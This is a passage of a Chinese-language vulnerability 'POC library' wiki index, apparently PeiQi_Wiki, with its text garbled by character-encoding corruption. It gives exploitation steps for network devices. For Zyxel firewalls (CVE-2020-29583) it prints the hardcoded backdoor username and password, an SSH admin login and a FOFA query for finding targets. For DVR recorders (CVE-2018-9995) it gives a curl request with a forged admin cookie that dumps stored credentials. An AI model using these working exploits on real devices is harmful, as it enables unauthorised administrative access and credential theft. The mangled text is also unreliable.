ä¸ºä»»ä½•äººéƒ½å¯ä»¥è½»æ¾åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä»DDoSåƒµå°¸ç½‘ç»œè¿è¥å•†åˆ°å‹’ç´¢è½¯ä»¶å›¢ä½“å’Œæ”¿åºœèµ„åŠ©çš„é»‘å®¢ã€‚ é€šè¿‡æ»¥ç”¨åé—¨è´¦æˆ·ï¼Œç½‘ç»œç½ªçŠ¯å¯ä»¥è®¿é—®æ˜“å—æ”»å‡»çš„è®¾å¤‡å¹¶æ„ŸæŸ“å†…éƒ¨ç½‘ç»œä»¥å‘èµ·å…¶ä»–æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç®¡ç†ç‰¹æƒç™»å½•è®¾å¤‡ï¼Œå¹¶è½»æ˜“ç ´åç½‘ç»œè®¾å¤‡ã€‚ æ¼æ´å½±å“ [!NOTE] Zyxel USGç³»åˆ— Zyxel ATPç³»åˆ— Zyxel NCXç³»åˆ— Zyxel USG FIEXç³»åˆ— Zyxel VPNç³»åˆ— FOFA [!NOTE] title=\"USG40\" ç­‰ æ¼æ´å¤ç° ä½¿ç”¨æ¼æ´æ‰«æè„šæœ¬æ‰¾åˆ°æ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ è¿›è¡Œæ”»å‡»ï¼Œç™»å½•ä¸ºåé—¨ç®¡ç†å‘˜è´¦æˆ· $ ssh zyfwp@xxx.xxx.xxx.xxx Password: PrOw!aN_fXp Router> show users current No: 1 Name: zyfwp Type: admin (...) Router> å‚è€ƒæ–‡ç«  scan_CVE-2020-29583 Zyxel USG Series è´¦æˆ·ç¡¬ç¼–ç æ¼æ´ï¼ˆCVE-2020-29583ï¼‰ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/","title":"ç½‘ç»œè®¾å¤‡æ¼æ´","keywords":"","body":"ç½‘ç»œè®¾å¤‡æ¼æ´ğŸ¦Œ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DVR/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DVR/","title":"DVR","keywords":"","body":"DVR DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DVR/DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DVR/DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995.html","title":"DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995","keywords":"","body":"DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995 æ¼æ´æè¿° DVRï¼Œå…¨ç§°ä¸ºDigital Video Recorder(ç¡¬ç›˜å½•åƒæœº)ï¼Œå³æ•°å­—è§†é¢‘å½•åƒæœºã€‚æœ€åˆç”±é˜¿æ ¹å»·ç ”ç©¶å‘˜å‘ç°ï¼Œé€šè¿‡ä½¿ç”¨â€œCookieï¼š uid = adminâ€çš„Cookieæ ‡å¤´æ¥è®¿é—®ç‰¹å®šDVRçš„æ§åˆ¶é¢æ¿ï¼ŒDVRå°†ä»¥æ˜æ–‡å½¢å¼å“åº”è®¾å¤‡çš„ç®¡ç†å‘˜å‡­è¯ã€‚ æ¼æ´å½±å“ [!NOTE] Novo CeNova QSee Pulnix XVR 5 in 1 (title: \"XVR Login\") Securus, - Security. Never Compromise !! - Night OWL DVR Login HVR Login MDVR Login æ¼æ´å¤ç° ä½¿ç”¨curlå‘½ä»¤è·å¾—è´¦å·å¯†ç  curl \"http://xxx.xxx.xxx.xxx/device.rsp?opt=user&cmd=list\" -H \"Cookie: uid=admin\" WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "}}